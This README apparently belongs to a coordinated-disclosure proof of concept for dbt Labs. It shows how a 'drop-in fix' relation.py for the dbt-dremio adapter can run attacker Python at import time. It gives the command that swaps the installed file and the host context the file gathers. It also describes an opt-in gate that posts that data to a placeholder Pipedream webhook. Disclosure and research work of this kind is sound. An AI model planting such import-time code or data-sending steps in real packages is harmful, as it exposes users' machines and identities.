# dbt-adapters-fix/ — SECURITY_POC LURE (models an attacker capability)

> ⚠️ **SECURITY RESEARCH PoC — READ FIRST**
> This folder models the exact thing an attacker would attach to the official
> guide's manual-edit step. Everything here is safe by default: a Python file
> printing a labeled local-only banner at import time. No network traffic (the
> only egress is the single-file opt-in demo gate below, armed via a local
> marker file the researcher creates on their OWN machine), no persistence, no
> subprocess, no file writes outside the adapter you consciously copy it over.
>
> Researcher: [@nvk0x](https://github.com/nvk0x) · coordinated disclosure to dbt Labs.
> This content will be removed or repurposed upon resolution or on triage request.

## Why this folder exists

The official guide [Build a data lakehouse with dbt v1 and Dremio Cloud](https://docs.getdbt.com/guides/build-dremio-lakehouse) tells its readers (step 2 under "Getting started") to open the *installed* dremio adapter's source and hand-edit it:

> In your integrated development environment, open the relation.py file in the Dremio adapter directory:\n
> `$HOME/Library/Python/3.9/lib/python/site-packages/dbt/adapters/dremio/relation.py`
>
> Find and update lines 51 and 52 to match the following syntax: …

Because the official flow already has victims manipulating installed Python package files from an IDE, a repo shipped through the docs' clone instruction has a natural second-order lure: **a pre-patched, drop-in `relation.py`** saved in a repo folder like `dbt-adapters-fix/`, with the repo-level instructions presenting it as a time-saver. A victim who copies it (one command, one conscious step beyond the docs text) has imported **attacker-authored Python** that runs at adapter import — i.e., on **every** subsequent dbt command, before any dbt or SQL logic.

## What this PoC's version does (inert by default)

`relation.py` in this folder is dbt-dremio **v1.5.0's** upstream adapter file (Apache-2.0, attribution header preserved) with:

1. the guide's own documented two-line patch applied (the lure's surface claim), and
2. a `SECURITY_POC` import-time marker that prints — **locally, to stderr** — the execution context an attacker would have access to at that position. Outbound transmission happens ONLY behind the single-file opt-in demo gate below (a `$HOME/.security_poc_demo` marker file; the endpoint URL lives only inside that local file — never in the repo):
   - OS user (`getpass.getuser()`), hostname (`socket.gethostname()`), OS platform, Python version, current working directory, and the imported file's absolute path.

Apply it (this simulates the "hypothetical victim" — run on your OWN machine/own test environment only):

```bash
cp dbt-adapters-fix/relation.py "$HOME/Library/Python/3.9/lib/python/site-packages/dbt/adapters/dremio/relation.py"
# Windows: %APPDATA%\Python\Python<XY>\site-packages\dbt\adapters\dremio\relation.py
```

Then run any dbt command (`dbt --version` is enough — no project needed):

```text
[SECURITY_POC] python: ATTACKER-CONTROLLED FILE executing at dbt adapter import (...)
[SECURITY_POC] python: local context — user=<you> | host=<your-host> | platform=<os> | python=<ver> | cwd=<dir>
```

Restore cleanly afterwards: reapply the guide's hand-edit to the original file, or reinstall the adapter:

```bash
pip install --force-reinstall --no-deps dbt-dremio==1.5.0
```

## Demo mode (opt-in exfiltration — used ONCE, on my own machine, in the submission video)

> ⚠️ Run this only on a machine you own, to an endpoint you own. The gate is inert unless the researcher deliberately creates the demo marker file on their own machine — no environment variables, nothing typed on camera, and the endpoint URL lives only inside that local file (never committed). Delete the Pipedream workflow after disclosure.

Arm the gate and prepare the video (both BEFORE recording — off-camera):

1. In Pipedream → create **HTTP endpoint (webhook)** — copy the generated URL, e.g. `https://eoXXXXXXXXXXXXXXXXX.m.pipedream.net`.
2. Write that URL into the one-shot demo marker:
   ```bash
   printf 'https://<YOUR-PIPEDREAM-HTTP-ENDPOINT>\n' > "$HOME/.security_poc_demo"
   ```
3. Start recording with the Pipedream event log shown **empty**.

On camera, the demo is then nothing but the guide's own four user steps — the import-time gate fires inside the run:

```bash
git clone https://github.com/dremio-brock/DremioDBTSample && cd DremioDBTSample/dremioSamples
# (guide step 2) open $HOME/Library/Python/3.9/lib/python/site-packages/dbt/adapters/dremio/relation.py
#   — the installed file was replaced with dbt-adapters-fix/relation.py before recording
# (guide step 3) create $HOME/.dbt/profiles.yml per the guide
dbt run -t cloud_dev     # → ONE exfiltration event fires; the marker self-deletes (one-shot)
```

The import-time marker then fires one best-effort HTTPS POST with your machine's own context. Expected receiving event body (your values):

```json
{
  "poc_id": "SECURITY_POC_nvk0x_dangling_docs_reference_takeover",
  "repo": "github.com/dremio-brock/DremioDBTSample",
  "machine_user": "<your mac username>",
  "host": "<your hostname>",
  "platform": "<os platform string>",
  "python": "<version>",
  "cwd": "<dir of the run>",
  "imported_file": "<absolute path of the copied relation.py>",
  "private_ip": "<LAN IP>"
}
```

Your **public IP needs no extra call**: the HTTPS request's source IP is recorded by Pipedream in the event metadata (the "ip"/network fields). That is your demonstrated egress receipt.

Restore the honest adapter afterwards (the marker self-deletes on firing; this cleans anything left over):

```bash
pip install --force-reinstall --no-deps dbt-dremio==1.5.0
rm -f "$HOME/.security_poc_demo"
```

## What the same file position means in a real attack (documentation, not shipped)

The import-time position in a real attacker file executes arbitrary Python with the victim's OS identity, file system access, and environment variables. Capabilities the PoC demonstrates as context prints; capabilities a real attacker would add — deliberately absent from this repo — are documented in the report's impact section (e.g., reading files, persistence via site-packages, or outbound exfiltration of the collected context; in the shipped file that exfiltration exists as the single-file opt-in demo gate described above — inert unless the demo marker file is created, self-deleting after one firing — and was exercised once on my own machine in the submission video).

## Provenance / license

- Base file: `dbt/adapters/dremio/relation.py` @ `dremio/dbt-dremio` tag `v1.5.0` — (C) 2022 Dremio Corporation, Apache License 2.0. Carried as-is apart from the two labeled additions (security banner + pre-applied guide patch).
- This folder is part of the SECURITY_POC disclosure package described in `../README.md`.
